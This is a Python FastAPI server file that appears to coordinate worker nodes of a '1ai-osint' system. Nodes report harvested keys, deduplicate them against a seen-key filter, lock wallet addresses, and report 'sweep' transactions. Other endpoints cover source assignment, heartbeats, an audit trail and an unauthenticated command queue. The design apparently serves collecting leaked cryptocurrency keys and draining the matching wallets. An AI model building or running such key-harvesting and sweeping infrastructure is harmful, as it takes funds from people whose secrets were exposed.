"""Master API — FastAPI app for master-node coordination."""

from __future__ import annotations

import logging
from contextlib import asynccontextmanager
from typing import Any, AsyncIterator

from fastapi import FastAPI, HTTPException
from pydantic import BaseModel

from src.modules.node import db

logger = logging.getLogger(__name__)


# ── Request models ──────────────────────────────────────────────────────────


class KeysRequest(BaseModel):
    node_id: str
    keys: list[dict[str, str]]  # [{key_hash, key_type, source}]


class HeartbeatRequest(BaseModel):
    node_id: str
    status: dict[str, Any]


class LockRequest(BaseModel):
    address: str
    node_id: str
    ttl_seconds: int = 300


class SweepRequest(BaseModel):
    address: str
    node_id: str
    sweep_tx: str


class ConfigRequest(BaseModel):
    node_id: str
    sources: list[str]


class CommandRequest(BaseModel):
    node_id: str
    command: str
    payload: dict = {}


# ── App ─────────────────────────────────────────────────────────────────────


@asynccontextmanager
async def lifespan(app: FastAPI) -> AsyncIterator[None]:
    """Startup/shutdown."""
    await db.init_db()
    logger.info("Master API started")
    yield
    await db.close_pool()
    logger.info("Master API stopped")


app = FastAPI(title="1ai-osint Master API", version="0.1.0", lifespan=lifespan)


# ── Endpoints ───────────────────────────────────────────────────────────────


@app.get("/api/health")
async def health() -> dict[str, Any]:
    """Health check."""
    return {"status": "ok", "service": "1ai-osint-master"}


@app.post("/api/keys")
async def report_keys(req: KeysRequest) -> dict[str, Any]:
    """Node reports found keys."""
    recorded = 0
    for key in req.keys:
        key_hash = key.get("key_hash", "")
        key_type = key.get("key_type", "")
        source = key.get("source", "")
        if not key_hash:
            continue
        if not await db.is_key_seen(key_hash):
            await db.mark_key_seen(key_hash, key_type, source, req.node_id)
            recorded += 1
    return {"status": "ok", "recorded": recorded, "total": len(req.keys)}


@app.get("/api/seen")
async def get_seen() -> dict[str, Any]:
    """Node downloads seen keys as Bloom filter."""
    bloom = await db.get_seen_keys_bloom()
    return {
        "status": "ok",
        "bloom": bloom.decode(),
        "count": bloom.count(b"|") + 1 if bloom else 0,
    }


@app.post("/api/locks")
async def acquire_lock(req: LockRequest) -> dict[str, Any]:
    """Node acquires sweep lock."""
    acquired = await db.acquire_sweep_lock(req.address, req.node_id, req.ttl_seconds)
    if not acquired:
        raise HTTPException(status_code=409, detail="Lock already held")
    return {"status": "ok", "address": req.address, "node_id": req.node_id}


@app.delete("/api/locks/{address}")
async def release_lock(address: str, node_id: str) -> dict[str, Any]:
    """Node releases sweep lock."""
    await db.release_sweep_lock(address, node_id)
    return {"status": "ok"}


@app.post("/api/heartbeat")
async def heartbeat(req: HeartbeatRequest) -> dict[str, Any]:
    """Node reports status. Returns actual node_id (may differ if duplicate)."""
    actual_id = await db.record_heartbeat(req.node_id, req.status)
    return {"status": "ok", "node_id": actual_id}


@app.get("/api/sources")
async def get_sources(node_id: str) -> dict[str, Any]:
    """Node fetches assigned sources."""
    sources = await db.get_assigned_sources(node_id)
    if not sources:
        # Auto-assign all sources if not assigned yet
        try:
            from src.modules.sources import ALL_SOURCES

            await db.assign_sources(node_id, list(ALL_SOURCES))
            sources = list(ALL_SOURCES)
        except Exception:
            # Fallback: return empty list if source discovery fails
            sources = []
    return {"status": "ok", "node_id": node_id, "sources": sources}


@app.post("/api/sources")
async def set_sources(req: ConfigRequest) -> dict[str, Any]:
    """Master assigns sources to a node."""
    await db.assign_sources(req.node_id, req.sources)
    return {"status": "ok", "node_id": req.node_id, "sources": req.sources}


@app.post("/api/sweep")
async def report_sweep(req: SweepRequest) -> dict[str, Any]:
    """Node reports sweep result."""
    await db.mark_swept(req.address, req.sweep_tx)
    return {"status": "ok", "address": req.address}


@app.get("/api/stats")
async def get_stats() -> dict[str, Any]:
    """Aggregate stats."""
    stats = await db.get_stats()
    return {"status": "ok", **stats}


@app.get("/api/audit")
async def get_audit(limit: int = 100) -> dict[str, Any]:
    """Full audit trail."""
    trail = await db.get_audit_trail(limit)
    return {"status": "ok", "events": trail}


@app.get("/api/nodes")
async def get_nodes() -> dict[str, Any]:
    """List all nodes and their status."""
    heartbeats = await db.get_all_heartbeats()
    return {"status": "ok", "nodes": heartbeats}


@app.post("/api/commands")
async def enqueue_command(req: CommandRequest) -> dict[str, Any]:
    """Enqueue a command for a node."""
    await db.enqueue_command(req.node_id, req.command, req.payload)
    return {"status": "ok", "node_id": req.node_id, "command": req.command}


@app.get("/api/commands/{node_id}")
async def claim_commands(node_id: str) -> dict[str, Any]:
    """Claim pending commands for a node."""
    commands = await db.claim_commands(node_id)
    return {"status": "ok", "commands": commands}
